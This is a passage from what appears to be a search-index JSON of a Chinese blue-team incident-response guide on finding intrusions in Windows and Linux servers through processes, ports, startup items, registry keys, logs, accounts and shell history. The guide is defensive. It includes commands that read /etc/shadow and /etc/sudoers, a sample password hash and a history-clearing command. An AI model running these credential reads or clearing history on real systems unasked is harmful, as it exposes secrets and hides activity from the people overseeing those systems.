a\u3001\u5f00\u59cb--\u8fd0\u884c--\u8f93\u5165msinfo32\uff0c\u4f9d\u6b21\u70b9\u51fb\u201c\u8f6f\u4ef6\u73af\u5883\u2192\u6b63\u5728\u8fd0\u884c\u4efb\u52a1\u201d\u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u3001\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU\u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684PID\uff1a netstat -ano | findstr \u201cport\u201d b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668--\u67e5\u770b--\u9009\u62e9\u5217--PID \u6216\u8005 tasklist | findstr \u201cPID\u201d c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u4efb\u52a1\u7ba1\u7406\u5668--\u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b--\u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u8fd0\u884c\u8f93\u5165 wmic\uff0ccmd\u754c\u9762 \u8f93\u5165 process d\u3001tasklist /svc \u8fdb\u7a0b--PID--\u670d\u52a1 e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a %system%/system32/drivers/etc/services\uff08\u4e00\u822c%system%\u5c31\u662fC:\\Windows\uff09","title":"1.2 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3\u3001\u8fdb\u7a0b"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#13","text":"1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig\uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\software\\micorsoft\\windows\\currentversion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce \u68c0\u67e5\u53f3\u4fa7\u662f\u5426\u6709\u542f\u52a8\u5f02\u5e38\u7684\u9879\u76ee\uff0c\u5982\u6709\u8bf7\u5220\u9664\uff0c\u5e76\u5efa\u8bae\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u75c5\u6bd2\u67e5\u6740\uff0c\u6e05\u9664\u6b8b\u7559\u75c5\u6bd2\u6216\u6728\u9a6c\u3002 d\u3001\u5229\u7528\u5b89\u5168\u8f6f\u4ef6\u67e5\u770b\u542f\u52a8\u9879\u3001\u5f00\u673a\u65f6\u95f4\u7ba1\u7406\u7b49\u3002 e\u3001\u7ec4\u7b56\u7565\uff0c\u8fd0\u884cgpedit.msc\u3002 2\u3001\u68c0\u67e5\u8ba1\u5212\u4efb\u52a1 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8bbe\u7f6e\u3011>\u3010\u63a7\u5236\u9762\u677f\u3011>\u3010\u4efb\u52a1\u8ba1\u5212\u3011\uff0c\u67e5\u770b\u8ba1\u5212\u4efb\u52a1\u5c5e\u6027\uff0c\u4fbf\u53ef\u4ee5\u53d1\u73b0\u6728\u9a6c\u6587\u4ef6\u7684\u8def\u5f84\u3002 b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff1b\u8f93\u5165 cmd\uff0c\u7136\u540e\u8f93\u5165at\uff0c\u68c0\u67e5\u8ba1\u7b97\u673a\u4e0e\u7f51\u7edc\u4e0a\u7684\u5176\u5b83\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u4f1a\u8bdd\u6216\u8ba1\u5212\u4efb\u52a1\uff0c\u5982\u6709\uff0c\u5219\u786e\u8ba4\u662f\u5426\u4e3a\u6b63\u5e38\u8fde\u63a5\u3002 3\u3001\u670d\u52a1\u81ea\u542f\u52a8 \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165services.msc\uff0c\u6ce8\u610f\u670d\u52a1\u72b6\u6001\u548c\u542f\u52a8\u7c7b\u578b\uff0c\u68c0\u67e5\u662f\u5426\u6709\u5f02\u5e38\u670d\u52a1\u3002","title":"1.3 \u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#14","text":"1\u3001\u67e5\u770b\u7cfb\u7edf\u7248\u672c\u4ee5\u53ca\u8865\u4e01\u4fe1\u606f \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165systeminfo\uff0c\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f 2\u3001\u67e5\u627e\u53ef\u7591\u76ee\u5f55\u53ca\u6587\u4ef6 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001 \u67e5\u770b\u7528\u6237\u76ee\u5f55\uff0c\u65b0\u5efa\u8d26\u53f7\u4f1a\u5728\u8fd9\u4e2a\u76ee\u5f55\u751f\u6210\u4e00\u4e2a\u7528\u6237\u76ee\u5f55\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u5efa\u7528\u6237\u76ee\u5f55\u3002 Window 2003 C:\\Documents and Settings Window 2008R2 C:\\Users\\ b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165%UserProfile%\\Recent\uff0c\u5206\u6790\u6700\u8fd1\u6253\u5f00\u5206\u6790\u53ef\u7591\u6587\u4ef6\u3002 c\u3001\u5728\u670d\u52a1\u5668\u5404\u4e2a\u76ee\u5f55\uff0c\u53ef\u6839\u636e\u6587\u4ef6\u5939\u5185\u6587\u4ef6\u5217\u8868\u65f6\u95f4\u8fdb\u884c\u6392\u5e8f\uff0c\u67e5\u627e\u53ef\u7591\u6587\u4ef6\u3002 d\u3001\u56de\u6536\u7ad9\u3001\u6d4f\u89c8\u5668\u4e0b\u8f7d\u76ee\u5f55\u3001\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55 e\u3001\u4fee\u6539\u65f6\u95f4\u5728\u521b\u5efa\u65f6\u95f4\u4e4b\u524d\u7684\u4e3a\u53ef\u7591\u6587\u4ef6 3\u3001\u5f97\u5230\u53d1\u73b0WEBSHELL\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f a\u3001\u5229\u7528 Registry Workshop \u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u641c\u7d22\u529f\u80fd\uff0c\u53ef\u4ee5\u627e\u5230\u6700\u540e\u5199\u5165\u65f6\u95f4\u533a\u95f4\u7684\u6587\u4ef6\u3002 b\u3001\u5229\u7528\u8ba1\u7b97\u673a\u81ea\u5e26\u6587\u4ef6\u641c\u7d22\u529f\u80fd\uff0c\u6307\u5b9a\u4fee\u6539\u65f6\u95f4\u8fdb\u884c\u641c\u7d22\u3002","title":"1.4 \u68c0\u67e5\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#15","text":"\u75c5\u6bd2\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u4e0b\u8f7d\u5b89\u5168\u8f6f\u4ef6\uff0c\u66f4\u65b0\u6700\u65b0\u75c5\u6bd2\u5e93\uff0c\u8fdb\u884c\u5168\u76d8\u626b\u63cf\u3002 webshell\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u9009\u62e9\u5177\u4f53\u7ad9\u70b9\u8def\u5f84\u8fdb\u884cwebshell\u67e5\u6740\uff0c\u5efa\u8bae\u4f7f\u7528\u4e24\u6b3ewebshell\u67e5\u6740\u5de5\u5177\u540c\u65f6\u67e5\u6740\uff0c\u53ef\u76f8\u4e92\u8865\u5145\u89c4\u5219\u5e93\u7684\u4e0d\u8db3\u3002","title":"1.5 \u81ea\u52a8\u5316\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#16","text":"\u7cfb\u7edf\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u524d\u63d0\uff1a\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 b\u3001Win+R\u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\u201ceventvwr.msc\u201d\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 C\u3001\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u5b89\u5168\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\uff0c\u5229\u7528Log Parser\u8fdb\u884c\u5206\u6790\u3002 WEB\u8bbf\u95ee\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u627e\u5230\u4e2d\u95f4\u4ef6\u7684web\u65e5\u5fd7\uff0c\u6253\u5305\u5230\u672c\u5730\u65b9\u4fbf\u8fdb\u884c\u5206\u6790\u3002 b\u3001\u63a8\u8350\u5de5\u5177\uff1aWindow\u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002 Linux\u4e0b\uff0c\u4f7f\u7528Shell\u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790","title":"1.6 \u65e5\u5fd7\u5206\u6790"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x02","text":"","title":"0x02 \u5de5\u5177\u7bc7"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#21","text":"PCHunter\uff1a http://www.xuetr.com \u706b\u7ed2\u5251\uff1a https://www.huorong.cn Process Explorer\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker\uff1a https://processhacker.sourceforge.io/downloads.php autoruns\uff1a https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL\uff1a https://www.bleepingcomputer.com/download/otl/ SysInspector\uff1a http://download.eset.com.cn/download/detail/?product=sysinspector","title":"2.1 \u75c5\u6bd2\u5206\u6790"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#22","text":"\u5361\u5df4\u65af\u57fa\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \uff08\u63a8\u8350\u7406\u7531\uff1a\u7eff\u8272\u7248\u3001\u6700\u65b0\u75c5\u6bd2\u5e93\uff09 \u5927\u8718\u86db\uff1a http://free.drweb.ru/download+cureit+free \uff08\u63a8\u8350\u7406\u7531\uff1a\u626b\u63cf\u5feb\u3001\u4e00\u6b21\u4e0b\u8f7d\u53ea\u80fd\u75281\u5468\uff0c\u66f4\u65b0\u75c5\u6bd2\u5e93\uff09 \u706b\u7ed2\u5b89\u5168\u8f6f\u4ef6\uff1a https://www.huorong.cn 360\u6740\u6bd2\uff1a http://sd.360.cn/download_center.html","title":"2.2 \u75c5\u6bd2\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#23","text":"CVERC-\u56fd\u5bb6\u8ba1\u7b97\u673a\u75c5\u6bd2\u5e94\u6025\u5904\u7406\u4e2d\u5fc3\uff1a http://www.cverc.org.cn \u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\uff1a https://x.threatbook.cn \u706b\u7ed2\u5b89\u5168\u8bba\u575b\uff1a http://bbs.huorong.cn/forum-59-1.html \u7231\u6bd2\u9738\u793e\u533a\uff1a http://bbs.duba.net \u817e\u8baf\u7535\u8111\u7ba1\u5bb6\uff1a http://bbs.guanjia.qq.com/forum-2-1.html","title":"2.3 \u75c5\u6bd2\u52a8\u6001"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#24","text":"http://www.virscan.org //\u591a\u5f15\u64ce\u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51 v1.02\uff0c\u5f53\u524d\u652f\u6301 41 \u6b3e\u6740\u6bd2\u5f15\u64ce https://habo.qq.com //\u817e\u8baf\u54c8\u52c3\u5206\u6790\u7cfb\u7edf https://virusscan.jotti.org //Jotti\u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u7cfb\u7edf http://www.scanvir.com //\u9488\u5bf9\u8ba1\u7b97\u673a\u75c5\u6bd2\u3001\u624b\u673a\u75c5\u6bd2\u3001\u53ef\u7591\u6587\u4ef6\u7b49\u8fdb\u884c\u68c0\u6d4b\u5206\u6790","title":"2.4 \u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51\u7ad9"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#25-webshell","text":"D\u76fe_Web\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6cwebshell\u67e5\u6740\uff1a http://www.shellpub.com \u6df1\u4fe1\u670dWebshell\u7f51\u7ad9\u540e\u95e8\u68c0\u6d4b\u5de5\u5177\uff1a http://edr.sangfor.com.cn/backdoor_detection.html Safe3\uff1a http://www.uusec.com/webshell.zip","title":"2.5 webshell\u67e5\u6740"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#2linux","text":"","title":"\u7b2c2\u7bc7\uff1aLinux\u5165\u4fb5\u6392\u67e5"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x00_1","text":"\u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9bLinux\u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002","title":"0x00 \u524d\u8a00"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#0x01_1","text":"","title":"0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#11_1","text":"\u57fa\u672c\u4f7f\u7528\uff1a 1\u3001\u7528\u6237\u4fe1\u606f\u6587\u4ef6/etc/passwd root:x:0:0:root:/root:/bin/bash account:password:UID:GID:GECOS:directory:shell \u7528\u6237\u540d\uff1a\u5bc6\u7801\uff1a\u7528\u6237ID\uff1a\u7ec4ID\uff1a\u7528\u6237\u8bf4\u660e\uff1a\u5bb6\u76ee\u5f55\uff1a\u767b\u9646\u4e4b\u540eshell \u6ce8\u610f\uff1a\u65e0\u5bc6\u7801\u53ea\u5141\u8bb8\u672c\u673a\u767b\u9646\uff0c\u8fdc\u7a0b\u4e0d\u5141\u8bb8\u767b\u9646 2\u3001\u5f71\u5b50\u6587\u4ef6/etc/shadow root:$6$oGs1PqhL2p3ZetrE$X7o7bzoouHQVSEmSgsYN5UD4.kMHx6qgbTqwNVC5oOAouXvcjQSt.Ft7ql1WpkopY0UV9ajBwUt1DpYxTCVvI/:16809:0:99999:7::: \u7528\u6237\u540d\uff1a\u52a0\u5bc6\u5bc6\u7801\uff1a\u5bc6\u7801\u6700\u540e\u4e00\u6b21\u4fee\u6539\u65e5\u671f\uff1a\u4e24\u6b21\u5bc6\u7801\u7684\u4fee\u6539\u65f6\u95f4\u95f4\u9694\uff1a\u5bc6\u7801\u6709\u6548\u671f\uff1a\u5bc6\u7801\u4fee\u6539\u5230\u671f\u5230\u7684\u8b66\u544a\u5929\u6570\uff1a\u5bc6\u7801\u8fc7\u671f\u4e4b\u540e\u7684\u5bbd\u9650\u5929\u6570\uff1a\u8d26\u53f7\u5931\u6548\u65f6\u95f4\uff1a\u4fdd\u7559 who \u67e5\u770b\u5f53\u524d\u767b\u5f55\u7528\u6237\uff08tty\u672c\u5730\u767b\u9646 pts\u8fdc\u7a0b\u767b\u5f55\uff09 w \u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\uff0c\u60f3\u77e5\u9053\u67d0\u4e00\u65f6\u523b\u7528\u6237\u7684\u884c\u4e3a uptime \u67e5\u770b\u767b\u9646\u591a\u4e45\u3001\u591a\u5c11\u7528\u6237\uff0c\u8d1f\u8f7d \u5165\u4fb5\u6392\u67e5\uff1a 1\u3001\u67e5\u8be2\u7279\u6743\u7528\u6237\u7279\u6743\u7528\u6237(uid \u4e3a0) [root@localhost ~]# awk -F: '$3==0{print $1}' /etc/passwd 2\u3001\u67e5\u8be2\u53ef\u4ee5\u8fdc\u7a0b\u767b\u5f55\u7684\u5e10\u53f7\u4fe1\u606f [root@localhost ~]# awk '/\\$1|\\$6/{print $1}' /etc/shadow 3\u3001\u9664root\u5e10\u53f7\u5916\uff0c\u5176\u4ed6\u5e10\u53f7\u662f\u5426\u5b58\u5728sudo\u6743\u9650\u3002\u5982\u975e\u7ba1\u7406\u9700\u8981\uff0c\u666e\u901a\u5e10\u53f7\u5e94\u5220\u9664sudo\u6743\u9650 [root@localhost ~]# more /etc/sudoers | grep -v \"^#\\|^$\" | grep \"ALL=(ALL)\" 4\u3001\u7981\u7528\u6216\u5220\u9664\u591a\u4f59\u53ca\u53ef\u7591\u7684\u5e10\u53f7 usermod -L user \u7981\u7528\u5e10\u53f7\uff0c\u5e10\u53f7\u65e0\u6cd5\u767b\u5f55\uff0c/etc/shadow\u7b2c\u4e8c\u680f\u4e3a!\u5f00\u5934 userdel user \u5220\u9664user\u7528\u6237 userdel -r user \u5c06\u5220\u9664user\u7528\u6237\uff0c\u5e76\u4e14\u5c06/home\u76ee\u5f55\u4e0b\u7684user\u76ee\u5f55\u4e00\u5e76\u5220\u9664","title":"1.1 \u8d26\u53f7\u5b89\u5168"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#12_1","text":"\u57fa\u672c\u4f7f\u7528\uff1a \u901a\u8fc7.bash_history\u67e5\u770b\u5e10\u53f7\u6267\u884c\u8fc7\u7684\u7cfb\u7edf\u547d\u4ee4 1\u3001root\u7684\u5386\u53f2\u547d\u4ee4 histroy 2\u3001\u6253\u5f00/home\u5404\u5e10\u53f7\u76ee\u5f55\u4e0b\u7684.bash_history\uff0c\u67e5\u770b\u666e\u901a\u5e10\u53f7\u7684\u5386\u53f2\u547d\u4ee4 \u4e3a\u5386\u53f2\u7684\u547d\u4ee4\u589e\u52a0\u767b\u5f55\u7684IP\u5730\u5740\u3001\u6267\u884c\u547d\u4ee4\u65f6\u95f4\u7b49\u4fe1\u606f\uff1a 1\uff09\u4fdd\u5b581\u4e07\u6761\u547d\u4ee4 sed -i 's/^HISTSIZE=1000/HISTSIZE=10000/g' /etc/profile 2\uff09\u5728/etc/profile\u7684\u6587\u4ef6\u5c3e\u90e8\u6dfb\u52a0\u5982\u4e0b\u884c\u6570\u914d\u7f6e\u4fe1\u606f\uff1a ######jiagu history xianshi######### USER_IP=`who -u am i 2>/dev/null | awk '{print $NF}' | sed -e 's/[()]//g'` if [ \"$USER_IP\" = \"\" ] then USER_IP=`hostname` fi export HISTTIMEFORMAT=\"%F %T $USER_IP `whoami` \" shopt -s histappend export PROMPT_COMMAND=\"history -a\" ######### jiagu history xianshi ########## 3\uff09source /etc/profile\u8ba9\u914d\u7f6e\u751f\u6548 \u751f\u6210\u6548\u679c\uff1a 1 2018-07-10 19:45:39 192.168.204.1 root source /etc/profile 3\u3001\u5386\u53f2\u64cd\u4f5c\u547d\u4ee4\u7684\u6e05\u9664\uff1ahistory -c \u4f46\u6b64\u547d\u4ee4\u5e76\u4e0d\u4f1a\u6e05\u9664\u4fdd\u5b58\u5728\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\uff0c\u56e0\u6b64\u9700\u8981\u624b\u52a8\u5220\u9664.bash_profile\u6587\u4ef6\u4e2d\u7684\u8bb0\u5f55\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u8fdb\u5165\u7528\u6237\u76ee\u5f55\u4e0b cat .bash_history >> history.txt","title":"1.2 \u5386\u53f2\u547d\u4ee4"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#13_1","text":"\u4f7f\u7528netstat \u7f51\u7edc\u8fde\u63a5\u547d\u4ee4\uff0c\u5206\u6790\u53ef\u7591\u7aef\u53e3\u3001IP\u3001PID netstat -antlp|more \u67e5\u770b\u4e0bpid\u6240\u5bf9\u5e94\u7684\u8fdb\u7a0b\u6587\u4ef6\u8def\u5f84\uff0c \u8fd0\u884cls -l /proc/$PID/exe\u6216file /proc/$PID/exe\uff08$PID \u4e3a\u5bf9\u5e94\u7684pid \u53f7\uff09","title":"1.3 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#14_1","text":"\u4f7f\u7528ps\u547d\u4ee4\uff0c\u5206\u6790\u8fdb\u7a0b ps aux | grep pid","title":"1.4 \u68c0\u67e5\u5f02\u5e38\u8fdb\u7a0b"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#15_1","text":"\u57fa\u672c\u4f7f\u7528\uff1a \u7cfb\u7edf\u8fd0\u884c\u7ea7\u522b\u793a\u610f\u56fe\uff1a \u8fd0\u884c\u7ea7\u522b \u542b\u4e49 0 \u5173\u673a 1 \u5355\u7528\u6237\u6a21\u5f0f\uff0c\u53ef\u4ee5\u60f3\u8c61\u4e3awindows\u7684\u5b89\u5168\u6a21\u5f0f\uff0c\u4e3b\u8981\u7528\u4e8e\u7cfb\u7edf\u4fee\u590d 2 \u4e0d\u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u4e0d\u542bNFS\u670d\u52a1 3 \u5b8c\u5168\u7684\u547d\u4ee4\u884c\u6a21\u5f0f\uff0c\u5c31\u662f\u6807\u51c6\u5b57\u7b26\u754c\u9762 4 \u7cfb\u7edf\u4fdd\u7559 5 \u56fe\u5f62\u6a21\u5f0f 6 \u91cd\u542f\u52a8 \u67e5\u770b\u8fd0\u884c\u7ea7\u522b\u547d\u4ee4 runlevel \u7cfb\u7edf\u9ed8\u8ba4\u5141\u8bb8\u7ea7\u522b vi /etc/inittab id=3\uff1ainitdefault \u7cfb\u7edf\u5f00\u673a\u540e\u76f4\u63a5\u8fdb\u5165\u54ea\u4e2a\u8fd0\u884c\u7ea7\u522b \u5f00\u673a\u542f\u52a8\u914d\u7f6e\u6587\u4ef6 /etc/rc.local /etc/rc.d/rc[0~6].d \u4f8b\u5b50:\u5f53\u6211\u4eec\u9700\u8981\u5f00\u673a\u542f\u52a8\u81ea\u5df1\u7684\u811a\u672c\u65f6\uff0c\u53ea\u9700\u8981\u5c06\u53ef\u6267\u884c\u811a\u672c\u4e22\u5728/etc/init.d\u76ee\u5f55\u4e0b\uff0c\u7136\u540e\u5728/etc/rc.d/rc*.d\u4e2d\u5efa\u7acb\u8f6f\u94fe\u63a5\u5373\u53ef root@localhost ~]# ln -s /etc/init.d/sshd /etc/rc.d/rc3.d/S100ssh \u6b64\u5904sshd\u662f\u5177\u4f53\u670d\u52a1\u7684\u811a\u672c\u6587\u4ef6\uff0cS100ssh\u662f\u5176\u8f6f\u94fe\u63a5\uff0cS\u5f00\u5934\u4ee3\u8868\u52a0\u8f7d\u65f6\u81ea\u542f\u52a8\uff1b\u5982\u679c\u662fK\u5f00\u5934\u7684\u811a\u672c\u6587\u4ef6\uff0c\u4ee3\u8868\u8fd0\u884c\u7ea7\u522b\u52a0\u8f7d\u65f6\u9700\u8981\u5173\u95ed\u7684\u3002 \u5165\u4fb5\u6392\u67e5\uff1a \u542f\u52a8\u9879\u6587\u4ef6\uff1a more /etc/rc.local /etc/rc.d/rc[0~6].d ls -l /etc/rc.d/rc3.d/","title":"1.5 \u68c0\u67e5\u5f00\u673a\u542f\u52a8\u9879"},{"location":"blueteam/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#16_1","text":"\u57fa\u672c\u4f7f\u7528 1\u3001\u5229\u7528crontab\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 \u57fa\u672c\u547d\u4ee4 crontab -l 